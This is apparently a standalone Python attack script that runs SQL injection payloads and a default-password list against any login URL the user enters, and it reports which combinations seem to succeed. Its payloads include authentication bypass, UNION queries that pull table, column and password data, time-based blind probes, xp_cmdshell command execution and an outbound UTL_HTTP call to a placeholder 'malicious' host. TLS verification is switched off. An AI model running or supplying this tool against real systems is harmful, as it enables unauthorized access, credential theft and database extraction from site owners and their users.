import requests
import time
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sql_payloads = [
    "' OR 1=1--", "' UNION SELECT null,version()--", "admin'--", "' OR 'a'='a",
    "'; WAITFOR DELAY '0:0:5'--", "' AND 1=CONVERT(int,(SELECT CURRENT_USER))--",
    "1' AND SLEEP(5)#", "' UNION SELECT table_name,column_name FROM information_schema.columns--",
    "'||(SELECT 0x4A6F686E20446F65)--", "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "admin' AND 1=1#", "';(SELECT * FROM users)--", "' OR username LIKE '%admin%'--",
    "' UNION SELECT 1,@@version--", "' AND (SELECT 1 FROM pg_sleep(5))--",
    "'||UTL_HTTP.REQUEST('http://malicious')--", "' OR password LIKE '%pass%'--",
    "'; EXEC xp_cmdshell('dir')--", "' UNION SELECT null,table_name FROM information_schema.tables--",
    "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97--"
]

passwords = [
    "admin", "password", "123456", "root", "test",
    "guest", "welcome",
    "password1", "admin123", "superuser", "default",
    "12345", "secret", "login"
]

sql_error_signatures = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query()",
    "mysql_fetch",
    "syntax error",
    "ORA-01756",
    "SQLSTATE"
]

def test_injection(target_url):
    results = []
    attempt = 1
    total = len(sql_payloads) * len(passwords)
    try:
        for payload in sql_payloads:
            for pwd in passwords:
                try:
                    data = {
                        'username': payload,
                        'password': pwd
                    }
                    print(f"[*] Attempt {attempt}/{total}: username='{payload}', password='{pwd}'")
                    start_time = time.time()
                    response = requests.post(
                        target_url, 
                        data=data, 
                        verify=False,
                        headers={'User-Agent': 'Mozilla/5.0'},
                        timeout=10
                    )
                    response_time = time.time() - start_time
                    text = response.text.lower()
                    vulnerable = False
                    reason = ""
                    if response.status_code in [301, 302]:
                        vulnerable = True
                        reason = "Redirect"
                    elif "welcome" in text:
                        vulnerable = True
                        reason = "'welcome' in response"
                    elif response_time > 5:
                        vulnerable = True
                        reason = "Slow response"
                    elif any(e in text for e in sql_error_signatures):
                        vulnerable = True
                        reason = "SQL error in response"
                    if vulnerable:
                        print(f"[+] Target vulnerable to: {payload}:{pwd} ({reason})")
                        results.append((payload, pwd, reason))
                    attempt += 1
                except Exception as e:
                    print(f"[!] Error on attempt {attempt}: {e}")
                    attempt += 1
                    continue
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Printing summary...\n")
    return results

if __name__ == "__main__":
    target = input("Enter target login URL: ")
    print(f"\nTesting {target}...\n")
    vulnerabilities = test_injection(target)
    print("\n[+] Vulnerabilities found:")
    if vulnerabilities:
        for payload, pwd, reason in vulnerabilities:
            print(f"[+] Target vulnerable to: {payload}:{pwd} ({reason})")
    else:
        print("[-] No vulnerabilities detected with the tested payloads and passwords.")
